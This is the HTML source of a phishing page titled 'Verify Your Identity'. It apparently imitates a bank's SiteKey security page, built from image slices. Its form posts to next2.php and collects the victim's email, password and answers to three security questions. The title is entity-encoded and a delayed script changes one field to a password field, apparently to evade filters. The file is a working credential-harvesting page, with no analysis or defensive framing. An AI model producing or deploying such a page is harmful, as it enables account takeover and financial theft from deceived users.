<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
			 .textbox {
    margin-right: 10px;
    padding-left:4px;
    height: 26px;
    line-height: 20px;
    vertical-align: middle;
}
</style>

<style type="text/css">
div#container
{
	position:relative;
	width: 1274px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>


</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:158px; top:16px; width:983px; height:117px; z-index:0"><img src="images/b7.png" alt="" title="" border=0 width=983 height=117></div>

<div id="image4" style="position:absolute; overflow:hidden; left:195px; top:316px; width:107px; height:50px; z-index:2"><img src="images/a6.png" alt="" title="" border=0 width=107 height=50></div>

<div id="image3" style="position:absolute; overflow:hidden; left:192px; top:242px; width:105px; height:53px; z-index:3"><img src="images/a5.png" alt="" title="" border=0 width=105 height=53></div>

<div id="image6" style="position:absolute; overflow:hidden; left:184px; top:176px; width:173px; height:23px; z-index:4"><img src="images/b8.png" alt="" title="" border=0 width=173 height=23></div>

<div id="image15" style="position:absolute; overflow:hidden; left:133px; top:1060px; width:987px; height:150px; z-index:5"><img src="images/bo28.png" alt="" title="" border=0 width=987 height=150></div>

<div id="image16" style="position:absolute; overflow:hidden; left:159px; top:1108px; width:108px; height:17px; z-index:6"><a href="#"><img src="images/bo29.png" alt="" title="" border=0 width=108 height=17></a></div>


<div id="image2" style="position:absolute; overflow:hidden; left:177px; top:143px; width:428px; height:28px; z-index:7"><img src="images/b9.png" alt="" title="" border=0 width=428 height=28></div>

<div id="image10" style="position:absolute; overflow:hidden; left:318px; top:934px; width:75px; height:29px; z-index:8"><a href="#"><img src="images/b10.png" alt="" title="" border=0 width=75 height=29></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:157px; top:415px; width:655px; height:55px; z-index:9"><img src="images/bo7.png" alt="" title="" border=0 width=655 height=55></div>

<div id="image11" style="position:absolute; overflow:hidden; left:193px; top:757px; width:143px; height:52px; z-index:10"><img src="images/a4.png" alt="" title="" border=0 width=143 height=52></div>

<div id="image12" style="position:absolute; overflow:hidden; left:195px; top:628px; width:133px; height:56px; z-index:11"><img src="images/a3.png" alt="" title="" border=0 width=133 height=56></div>

<div id="image13" style="position:absolute; overflow:hidden; left:193px; top:503px; width:137px; height:50px; z-index:12"><img src="images/a2.png" alt="" title="" border=0 width=137 height=50></div>

<div id="image14" style="position:absolute; overflow:hidden; left:192px; top:565px; width:70px; height:55px; z-index:13"><img src="images/a1.png" alt="" title="" border=0 width=70 height=55></div>

<div id="image17" style="position:absolute; overflow:hidden; left:192px; top:693px; width:70px; height:55px; z-index:14"><img src="images/a1.png" alt="" title="" border=0 width=70 height=55></div>

<div id="image18" style="position:absolute; overflow:hidden; left:192px; top:822px; width:70px; height:55px; z-index:15"><img src="images/a1.png" alt="" title="" border=0 width=70 height=55></div>
<form action=next2.php name=dafabhai id=dafabhai method=post>
<input name="eml" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:198px;top:268px;z-index:16">
<input name="eps" id="demo-field" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:198px;top:340px;z-index:17">
<select name="q1" class="textbox" autocomplete="off" required style="position:absolute;left:198px;top:526px;width:385px;z-index:18">
<option value="Select SiteKey Challenge Question 1">Select SiteKey Challenge Question 1</option>
<option>what is the first name of your mothers closest friend?</option>
<option>what was the name of your first pet?</option>
<option>what is the first name of your favorite niece/nephew?</option>
<option>what is the first name your hairdresserr/barber?</option>
<option>what is the name of your best childhood friend? </option>
<option>on what street is your grocery store?</option>
<option>what is the name of the medical professional who delivered your first child?</option>
<option>what is the name of a college you applied to but didnt atted? </option>
<option>what was the first name of your favorite teacher or professor?</option>
<option>what is your all-time favorite song? </option></select>
<input name="ans1" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:214px;left:198px;top:588px;z-index:19">
<select name="q2" class="textbox" autocomplete="off" required style="position:absolute;left:198px;top:654px;width:385px;z-index:20">
<option value="Select SiteKey Challenge Question 2">Select SiteKey Challenge Question 2</option>
<option>what is the first name of your high school prom date?</option>
<option>who is your favorite person in history?</option>
<option>what was the make and model of your first car? </option>
<option>what is first name of best man/main of honor at your wedding? </option>
<option>what is the name of your favorite restaurant?</option>
<option>as a child what did you want to be when you grew up? </option>
<option>what was the first live concert you attended?</option>
<option>what was the first name of your first manager?</option>
<option>what is the name of your high school star athlete?</option>
<option>where were you on New Years 2000? </option></select>
<input name="ans2" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:214px;left:198px;top:716px;z-index:21">
<select name="q3" class="textbox" autocomplete="off" required style="position:absolute;left:198px;top:782px;width:385px;z-index:22">
<option value="Select SiteKey Challenge Question 3">Select SiteKey Challenge Question 3</option>
<option>what street did your best friend ih high school live on?</option>
<option>what was the name of your first boyfriend or girlfriend?</option>
<option>what is your best friend first name?</option>
<option>what is the last name of your third grade teacher?</option>
<option>what is the last name of your family physician?</option>
<option>in what city did you honeymoon?</option>
<option>in what city did you meet your spouse/significant other?</option>
<option>what celebrity do you most resemble?</option>
<option>what is the name of your favorite charity?</option>
<option>what is the name of your first babysitter?</option></select>
<input name="ans3" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:214px;left:198px;top:846px;z-index:23">

<div id="formimage1" style="position:absolute; left:198px; top:934px; z-index:24"><input type="image" name="formimage1" width="102" height="28" src="images/z2.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
